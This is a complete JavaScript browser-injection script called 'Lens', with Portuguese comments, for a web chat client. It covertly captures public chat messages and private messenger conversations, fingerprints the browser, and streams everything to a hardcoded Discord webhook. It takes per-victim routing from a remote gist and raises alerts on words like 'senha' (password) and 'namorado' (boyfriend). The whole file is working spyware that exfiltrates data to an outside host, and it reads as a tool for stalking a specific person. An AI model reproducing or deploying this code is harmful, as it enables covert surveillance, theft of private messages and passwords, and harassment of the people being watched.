
(function() {
    'use strict';

    if (window._lens) {
        try { if (typeof window._lens.kill === 'function') window._lens.kill(); } catch(e) {}
        delete window._lens;
    }

    // ============================================================
    // CONFIG
    // ============================================================
    var DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
    var CONFIG_URL = 'https://gist.githubusercontent.com/zBeyond5/aac262f7fa7ad61ba4bb9d47e80cfe37/raw/6cf12524bcaaa34b86484746799ad54c5a1e63e8/lens.json';

    var ALERT_WORDS = ['sang', 'sangue', 'sangui', 'chris', 'namorado', 'senha'];
    var ALERT_PING = '@everyone';
    var ALLOWED_ROLES = ['1552637564597436537'];

    var PRIVATE_WINDOW_SEL = '.nitro-friends-messenger';
    var PRIVATE_PEER_SEL = '.messenger-active-chat-header .fw-bold.text-truncate';
    var PRIVATE_MSGS_SEL = '.chat-messages';
    var PRIVATE_MSG_SEL = '.messages-group-left, .messages-group-right';
    var PRIVATE_SKIP_HISTORY = true;
    var PRIVATE_PING = '<@&1552637564597436537>';
    var PRIVATE_FIRST_SCAN_DELAY = 300;
    // ============================================================

    var DEBUG = false;
    var MSG_TEMPLATE = '**{user}**: {msg}';
    var HEADER_INTERVAL = 60 * 1000;
    var CONFIG_REFRESH_MS = 5 * 60 * 1000;
    var PUBLIC_SKIP_HISTORY = true;
    var MIN_MSG_LEN = 1;
    var SCAN_DEBOUNCE_MS = 80;

    var SEL_PRIMARY = '.chat-content';
    var SEL_BUBBLE = '.bubble-container';
    var SEL_VISIBLE = 'chatbubblevisible';
    var USER_SELECTORS = ['.username','.user','.nick','.author','[class*="username" i]','[class*="nick" i]','[class*="author" i]'];

    var _queue = [];
    var _isSending = false;
    var _lastHeaderTime = 0;
    var _seen = new Set();
    var _observer = null;
    var _scanScheduled = false;
    var _noop = function() {};

    var _remoteConfig = null;
    var _remoteConfigAt = 0;
    var _sessionHash = null;
    var _sessionLabel = '';
    var _announcedHash = null;

    function _log() {
        if (DEBUG) console.log.apply(console, ['[Lens:' + _sessionHash + ']'].concat(Array.prototype.slice.call(arguments)));
    }

    // ================= SESSÃO =================
    function _persistentSeed() {
        var k = 'lens_seed';
        var s = null;
        try { s = localStorage.getItem(k); } catch(e) {}
        if (!s) {
            s = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
            try { localStorage.setItem(k, s); } catch(e) {}
        }
        return s;
    }

    function _hashStr(s) {
        var h = 5381;
        for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
        return (h >>> 0).toString(36);
    }

    function _computeHash() {
        var parts = [
            navigator.userAgent || '',
            navigator.language || '',
            navigator.platform || '',
            (screen.width + 'x' + screen.height) || '',
            String((new Date()).getTimezoneOffset()),
            _persistentSeed()
        ];
        return _hashStr(parts.join('|'));
    }

    // ================= CONFIG REMOTA =================
    function _fetchConfig() {
        if (!CONFIG_URL || CONFIG_URL.indexOf('http') !== 0) return Promise.resolve(_remoteConfig);
        var sep = CONFIG_URL.indexOf('?') === -1 ? '?' : '&';
        var url = CONFIG_URL + sep + 't=' + Date.now();
        return fetch(url, { cache: 'no-store' })
            .then(function(r) { return r.ok ? r.json() : null; })
            .then(function(j) {
                if (j && typeof j === 'object') {
                    _remoteConfig = j;
                    _remoteConfigAt = Date.now();
                    _applyConfig();
                    _log('config atualizada:', Object.keys(j).length, 'sessões');
                }
                return _remoteConfig;
            })
            .catch(function(e) { _log('config fetch falhou:', String(e)); return _remoteConfig; });
    }

    function _ensureConfigFresh() {
        if (Date.now() - _remoteConfigAt < CONFIG_REFRESH_MS && _remoteConfig) return;
        _fetchConfig();
    }

    function _applyConfig() {
        if (!_remoteConfig || !_sessionHash) return;
        var entry = _remoteConfig[_sessionHash];
        if (entry && entry.label) {
            var newLabel = String(entry.label);
            if (newLabel !== _sessionLabel) {
                _sessionLabel = newLabel;
                _log('label atualizado:', newLabel);
            }
        }
    }

    function _route() {
        if (_remoteConfig && _sessionHash && _remoteConfig[_sessionHash] && _remoteConfig[_sessionHash].webhook) {
            return {
                url: _remoteConfig[_sessionHash].webhook,
                label: _remoteConfig[_sessionHash].label || '',
                mapped: true
            };
        }
        return { url: DEFAULT_WEBHOOK, label: '', mapped: false };
    }

    function _displayTag() {
        return _sessionLabel ? (_sessionLabel + ' [' + _sessionHash + ']') : _sessionHash;
    }

    // ================= TIME =================
    function _nowBrasilia() {
        var now = new Date();
        var brt = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
        var dd = String(brt.getDate()).padStart(2, '0');
        var mm = String(brt.getMonth() + 1).padStart(2, '0');
        var yyyy = brt.getFullYear();
        var hh = String(brt.getHours()).padStart(2, '0');
        var min = String(brt.getMinutes()).padStart(2, '0');
        var ss = String(brt.getSeconds()).padStart(2, '0');
        return dd + '/' + mm + '/' + yyyy + ' ' + hh + ':' + min + ':' + ss;
    }

    function _nowHHMM() { return _nowBrasilia().substring(11, 16); }

    // ================= DOM EXTRACT (público) =================
    function _extractUserFromContent(content) {
        for (var i = 0; i < USER_SELECTORS.length; i++) {
            try {
                var el = content.querySelector(USER_SELECTORS[i]);
                if (!el) continue;
                var t = (el.textContent || '').trim();
                if (!t || t.length > 40) continue;
                var full = (content.innerText || content.textContent || '').trim();
                if (t === full) continue;
                return t;
            } catch (e) {}
        }
        var spans = content.querySelectorAll('b, strong, span');
        for (var j = 0; j < spans.length; j++) {
            var st = (spans[j].textContent || '').trim();
            if (!st || st.length > 30) continue;
            if (/[.!?]/.test(st)) continue;
            var full2 = (content.innerText || content.textContent || '').trim();
            if (st === full2) continue;
            return st;
        }
        return null;
    }

    function _cleanMsg(full, user) {
        var msg = full;
        if (user && msg.indexOf(user) === 0) msg = msg.slice(user.length);
        return msg.replace(/^\s*[\s:>|·•\-–—]+/, '').trim();
    }

    function _extractFromBubble(bubble) {
        if (!bubble || bubble.nodeType !== 1) return null;
        var content = bubble.querySelector(SEL_PRIMARY);
        if (!content) return null;
        var full = (content.innerText || content.textContent || '').trim();
        if (!full) return null;
        var user = _extractUserFromContent(content);
        if (!user) return null;
        var msg = _cleanMsg(full, user);
        if (!msg || msg.length < MIN_MSG_LEN) return null;
        return { user: user, msg: msg };
    }

    // ================= PRIVATE WINDOW =================
    var _privateOpen = false;
    var _privateEl = null;
    var _privateMsgsEl = null;
    var _privateMsgsObserver = null;
    var _privateSeenEls = new WeakSet();
    var _privateFirstScan = true;

    function _checkPrivate() {
        var el = null;
        try { el = document.querySelector(PRIVATE_WINDOW_SEL); } catch(e) {}
        if (el && !_privateOpen) _openPrivate(el);
        else if (!el && _privateOpen) _closePrivate();
    }

    function _privatePeer(el) {
        if (!el) return '';
        try {
            var n = el.querySelector(PRIVATE_PEER_SEL);
            return n ? (n.textContent || '').trim() : '';
        } catch(e) { return ''; }
    }

    function _openPrivate(el) {
        _privateOpen = true;
        _privateEl = el;
        _privateSeenEls = new WeakSet();
        _privateFirstScan = true;

        var peer = _privatePeer(el);
        var tag = _route().mapped ? _displayTag() : _sessionHash;

        _enqueue('━━━━━━━━ 🔒 ' + PRIVATE_PING + ' ━━━━━━━━');
        _enqueue('`' + _nowBrasilia() + '` 🔓 **janela privada ABERTA**' + (peer ? ' · **' + peer + '**' : '') + ' · ' + tag);

        _watchPrivateMsgs(el);
        _log('private open', peer);
    }

    function _closePrivate() {
        var peer = _privatePeer(_privateEl);
        _enqueue('`' + _nowBrasilia() + '` 🔒 **janela privada FECHADA**' + (peer ? ' · **' + peer + '**' : ''));
        _enqueue('━━━━━━━━ 🔒 fim privado ━━━━━━━━');

        _privateOpen = false;
        _privateEl = null;
        _privateMsgsEl = null;
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
        _privateSeenEls = new WeakSet();
        _log('private close');
    }

    function _watchPrivateMsgs(el) {
        var msgs = null;
        try { msgs = el.querySelector(PRIVATE_MSGS_SEL); } catch(e) {}
        if (!msgs) { _log('private .chat-messages não achado'); return; }
        _privateMsgsEl = msgs;
        _privateMsgsObserver = new MutationObserver(function() { _scanPrivateMsgs(); });
        _privateMsgsObserver.observe(msgs, { childList: true, subtree: true, characterData: true });
        setTimeout(_scanPrivateMsgs, PRIVATE_FIRST_SCAN_DELAY);
    }

    function _scanPrivateMsgs() {
        if (!_privateMsgsEl) return;
        var groups;
        try { groups = _privateMsgsEl.querySelectorAll(PRIVATE_MSG_SEL); } catch(e) { return; }

        for (var i = 0; i < groups.length; i++) {
            var g = groups[i];
            var userEl = g.querySelector('.fw-bold');
            var user = userEl ? (userEl.textContent || '').trim() : '';
            var isSelf = g.classList.contains('messages-group-right');
            var textEls = g.querySelectorAll('.text-break');

            for (var j = 0; j < textEls.length; j++) {
                var te = textEls[j];
                if (_privateSeenEls.has(te)) continue;
                var text = (te.textContent || '').trim();
                if (!text) continue;
                _privateSeenEls.add(te);
                if (_privateFirstScan && PRIVATE_SKIP_HISTORY) continue;
                _emitPrivateText(user, text, isSelf);
            }
        }
        _privateFirstScan = false;
    }

    function _emitPrivateText(user, text, isSelf) {
        var arrow = isSelf ? '➡️' : '⬅️';
        var line = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
        _log('private emit:', user, '→', text);
        _enqueue(line);
    }

    // ================= SCAN (público) =================
    function _scanBubbles(initial) {
        _checkPrivate();
        var bubbles;
        try { bubbles = document.querySelectorAll(SEL_BUBBLE); } catch (e) { return; }

        var emitted = 0;
        for (var i = 0; i < bubbles.length; i++) {
            var data = _extractFromBubble(bubbles[i]);
            if (!data) continue;
            var key = data.user + '\u0000' + data.msg;
            if (_seen.has(key)) continue;
            _seen.add(key);
            if (initial && PUBLIC_SKIP_HISTORY) continue;
            _emit(data.user, data.msg);
            emitted++;
        }

        if (_seen.size > 2000) {
            _seen.clear();
            for (var k = 0; k < bubbles.length; k++) {
                var d2 = _extractFromBubble(bubbles[k]);
                if (d2) _seen.add(d2.user + '\u0000' + d2.msg);
            }
        }
        if (emitted) _log('emitidos', emitted, 'novos');
    }

    function _scheduleScan() {
        if (_scanScheduled) return;
        _scanScheduled = true;
        setTimeout(function() {
            _scanScheduled = false;
            _scanBubbles(false);
        }, SCAN_DEBOUNCE_MS);
    }

    function _startObserver() {
        if (_observer) return;
        _scanBubbles(true);
        _observer = new MutationObserver(function(muts) {
            for (var i = 0; i < muts.length; i++) {
                var m = muts[i];
                if (m.type === 'childList' && m.addedNodes.length) { _scheduleScan(); return; }
                if (m.type === 'characterData') { _scheduleScan(); return; }
                if (m.type === 'attributes' && m.target && m.target.classList &&
                    m.target.classList.contains(SEL_VISIBLE)) { _scheduleScan(); return; }
            }
        });
        var root = document.body || document.documentElement;
        if (root) {
            _observer.observe(root, {
                childList: true, subtree: true, characterData: true,
                attributes: true, attributeFilter: ['class']
            });
        }
    }

    function _stopObserver() {
        if (_observer) { _observer.disconnect(); _observer = null; }
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
    }

    // ================= FORMAT + SEND =================
    function _format(user, msg) {
        return MSG_TEMPLATE.replace('{user}', user).replace('{msg}', msg);
    }

    function _hasAlert(msg) {
        var low = String(msg || '').toLowerCase();
        for (var i = 0; i < ALERT_WORDS.length; i++) {
            if (low.indexOf(ALERT_WORDS[i].toLowerCase()) !== -1) return true;
        }
        return false;
    }

    function _emit(user, msg) {
        _ensureConfigFresh();
        var prefix = _hasAlert(msg) ? (ALERT_PING + ' ') : '';
        var line = prefix + '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
        _log('emit:', user, '→', msg, prefix ? '[ALERTA]' : '');
        _enqueue(line);
    }

    function _checkHeader() {
        var now = Date.now();
        if (now - _lastHeaderTime >= HEADER_INTERVAL) {
            var r = _route();
            var tag = r.mapped ? _displayTag() : ('novo · ' + _sessionHash + ' · mapeie no gist');
            _queue.push('━━━━━━━ 🕐 ' + _nowHHMM() + ' · ' + tag + ' ━━━━━━━');
            _lastHeaderTime = now;
        }
    }

    function _announceIfNew() {
        if (_route().mapped) return;
        if (_announcedHash === _sessionHash) return;
        _announcedHash = _sessionHash;
        var line = '🟢 **nova sessão** `' + _sessionHash + '`\n' +
                   'UA: `' + (navigator.userAgent || '').slice(0, 90) + '`\n' +
                   'adicione no gist: `"' + _sessionHash + '": { "webhook": "...", "label": "..." }`';
        fetch(DEFAULT_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: line, username: 'Lens · ' + _sessionHash })
        }).catch(_noop);
    }

    function _enqueue(line) {
        if (!line || line.length < 5) return;
        _checkHeader();
        _queue.push(line);
        if (!_isSending) _flush();
    }

    function _flush() {
        if (_isSending || _queue.length === 0) return;
        _isSending = true;

        var target = _route().url;
        var batch = _queue.splice(0, 5);
        var content = batch.join('\n');
        if (content.length > 1950) content = content.substring(0, 1950) + '...';

        fetch(target, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: content,
                username: 'Lens · ' + _displayTag(),
                allowed_mentions: { parse: ['everyone'], roles: ALLOWED_ROLES }
            })
        }).catch(_noop).finally(function() {
            _isSending = false;
            setTimeout(_flush, 400);
        });
    }

    // ================= INIT / KILL =================
    function init() {
        _sessionHash = _computeHash();
        _log('inicializando. hash=' + _sessionHash);
        console.log('%c[Lens]','color:#22d3ee;font-weight:bold','sessão ' + _sessionHash + ' · window._lens.stats()');

        _fetchConfig().then(function() {
            _applyConfig();
            _announceIfNew();
        });
        setInterval(_fetchConfig, CONFIG_REFRESH_MS);

        _startObserver();
    }

    function kill() {
        _log('desligando...');
        _queue.length = 0;
        _seen.clear();
        _stopObserver();
        _privateOpen = false;
        _privateEl = null;
        _privateMsgsEl = null;
        _privateSeenEls = new WeakSet();
        delete window._lens;
    }

    Object.defineProperty(window, '_lens', {
        value: {
            kill: kill,
            init: init,
            scan: function() { _scanBubbles(false); },
            hash: function() { return _sessionHash; },
            label: function() { return _sessionLabel; },
            route: function() { return _route(); },
            refreshConfig: function() { return _fetchConfig(); },
            forceRoute: function(hash, entry) {
                if (!_remoteConfig) _remoteConfig = {};
                _remoteConfig[hash || _sessionHash] = entry;
                _remoteConfigAt = Date.now() + CONFIG_REFRESH_MS * 10;
                _applyConfig();
                return _route();
            },
            privateOpen: function() { return _privateOpen; },
            privatePeer: function() { return _privatePeer(_privateEl); },
            privateScan: function() { _scanPrivateMsgs(); },
            stats: function() {
                return {
                    hash: _sessionHash,
                    label: _sessionLabel,
                    route: _route(),
                    seen: _seen.size,
                    queue: _queue.length,
                    privateOpen: _privateOpen,
                    privatePeer: _privatePeer(_privateEl)
                };
            }
        },
        configurable: false,
        enumerable: false,
        writable: false
    });

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }

})();
